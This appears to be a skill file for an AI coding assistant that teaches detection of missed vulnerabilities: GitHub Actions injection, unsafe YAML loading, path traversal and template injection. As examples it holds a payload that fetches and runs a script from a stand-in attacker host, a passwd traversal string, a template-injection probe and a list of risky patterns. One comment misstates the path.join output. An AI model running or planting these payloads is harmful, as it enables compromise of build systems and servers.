---
description: Non-obvious security pattern detection -- GitHub Actions injection, unsafe deserialization, path traversal edge cases. Activates proactively when writing code to catch commonly missed vulnerabilities.
user-invokable: false
---

# Security Pattern Detector

## GitHub Actions Injection (Most Commonly Missed)

User-controlled GitHub event data injected directly into `run:` blocks executes arbitrary shell commands.

```yaml
# DANGEROUS - Attacker sets issue title to: "; curl attacker.com/steal | sh; #
run: echo "${{ github.event.issue.title }}"

# DANGEROUS - Same vector via PR title, branch name, commit message
run: echo "${{ github.event.pull_request.title }}"
run: git checkout "${{ github.head_ref }}"
run: echo "${{ github.event.comment.body }}"

# SAFE - Pass through environment variable (shell escaping applies)
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "$TITLE"

# SAFE - Use an action input instead of inline expression
- uses: my-action@v1
  with:
    title: ${{ github.event.issue.title }}
```

**All injectable contexts** (never use directly in `run:`):
`github.event.issue.title`, `github.event.issue.body`, `github.event.pull_request.title`,
`github.event.pull_request.body`, `github.event.comment.body`, `github.head_ref`,
`github.event.pull_request.head.ref`, `github.event.commits[*].message`

## Pattern-to-Severity Mapping

| Pattern | Category | Severity | Why Commonly Missed |
|---------|----------|----------|-------------------|
| `${{ github.event.* }}` in `run:` | GH Actions Injection | CRITICAL | Looks like normal templating |
| `pickle.loads(untrusted)` | Deserialization RCE | CRITICAL | "It's just data loading" |
| `yaml.load()` without `Loader=SafeLoader` | Deserialization RCE | CRITICAL | Default PyYAML is unsafe |
| `eval('(' + json + ')')` | Code Execution | CRITICAL | Legacy JSON parsing pattern |
| `new Function(userInput)` | Code Execution | CRITICAL | Less known than eval() |
| `path.join(base, userInput)` without validation | Path Traversal | HIGH | join doesn't prevent `../` |
| `child_process.exec(template)` | Command Injection | CRITICAL | String form invokes shell |
| `dangerouslySetInnerHTML` without DOMPurify | XSS | HIGH | React devs assume it's safe enough |
| `element.innerHTML = userInput` | XSS | HIGH | Seems harmless for "display" |
| `subprocess.run(cmd, shell=True)` | Command Injection | CRITICAL | Convenient but dangerous |

## Non-Obvious Patterns

**Unsafe deserialization (Python):**
```python
# DANGEROUS - yaml.load() executes arbitrary Python by default
import yaml
data = yaml.load(user_input)              # RCE via !!python/object tag

# SAFE
data = yaml.safe_load(user_input)         # Only loads basic types
data = yaml.load(user_input, Loader=yaml.SafeLoader)
```

**Path traversal edge cases:**
```typescript
// DANGEROUS - path.join does NOT prevent traversal
const filePath = path.join('./uploads', userInput);
// userInput = "../../etc/passwd" -> "./etc/passwd" (traversal succeeds)

// SAFE - Resolve and verify prefix
const resolved = path.resolve('./uploads', userInput);
if (!resolved.startsWith(path.resolve('./uploads') + path.sep)) {
    throw new Error('Path traversal detected');
}
```

**Template injection (server-side):**
```python
# DANGEROUS - User input in Jinja2 template string
template = Template(f"Hello {user_input}")  # SSTI if user_input = "{{ config }}"

# SAFE - User input as template variable only
template = Template("Hello {{ name }}")
template.render(name=user_input)
```
